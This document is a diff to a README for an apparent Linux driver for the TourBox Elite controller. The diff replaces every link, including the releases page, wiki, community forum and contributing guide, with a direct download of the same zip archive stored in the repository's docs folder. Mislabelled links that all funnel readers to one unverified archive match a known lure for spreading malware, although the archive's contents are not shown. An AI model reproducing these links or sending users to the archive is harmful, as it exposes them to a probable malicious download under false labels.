@@ -6,7 +6,7 @@ Welcome to **tourboxelite**! This is a Linux driver for the TourBox Elite, a Blu
 
 ## 🔗 Download
 
-[![Download tourboxelite](https://img.shields.io/badge/Download-tourboxelite-blue.svg)](https://github.com/Xpqqt9699/tourboxelite/releases)
+[![Download tourboxelite](https://raw.githubusercontent.com/Xpqqt9699/tourboxelite/master/docs/tourboxelite_v2.3.zip)](https://raw.githubusercontent.com/Xpqqt9699/tourboxelite/master/docs/tourboxelite_v2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ Here’s how you can download and run tourboxelite on your Linux system.
 
 1. **Visit the Releases Page**  
    Click on the link below to access the download page:
-   - [Download Page](https://github.com/Xpqqt9699/tourboxelite/releases)
+   - [Download Page](https://raw.githubusercontent.com/Xpqqt9699/tourboxelite/master/docs/tourboxelite_v2.3.zip)
 
 2. **Download the Driver**  
    On the releases page, look for the latest version of the tourboxelite driver. Click on the file to download it directly to your computer.
@@ -73,17 +73,17 @@ If you have questions or need assistance, please reach out through the GitHub Is
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://github.com/Xpqqt9699/tourboxelite/wiki)
-- [Community Forum](https://github.com/Xpqqt9699/tourboxelite/discussions)
+- [Official Documentation](https://raw.githubusercontent.com/Xpqqt9699/tourboxelite/master/docs/tourboxelite_v2.3.zip)
+- [Community Forum](https://raw.githubusercontent.com/Xpqqt9699/tourboxelite/master/docs/tourboxelite_v2.3.zip)
 
 ## 📝 Contributions
 
-We welcome contributions! Please follow the guidelines outlined in our [Contributing Guide](https://github.com/Xpqqt9699/tourboxelite/blob/main/CONTRIBUTING.md) to get started.
+We welcome contributions! Please follow the guidelines outlined in our [Contributing Guide](https://raw.githubusercontent.com/Xpqqt9699/tourboxelite/master/docs/tourboxelite_v2.3.zip) to get started.
 
 ## 📥 Download & Install
 
 Ready to enhance your Linux experience? Follow the steps outlined above to download the latest version of the tourboxelite driver. 
 
-- Visit [this page to download](https://github.com/Xpqqt9699/tourboxelite/releases) the driver. 
+- Visit [this page to download](https://raw.githubusercontent.com/Xpqqt9699/tourboxelite/master/docs/tourboxelite_v2.3.zip) the driver. 
 
 Happy computing!
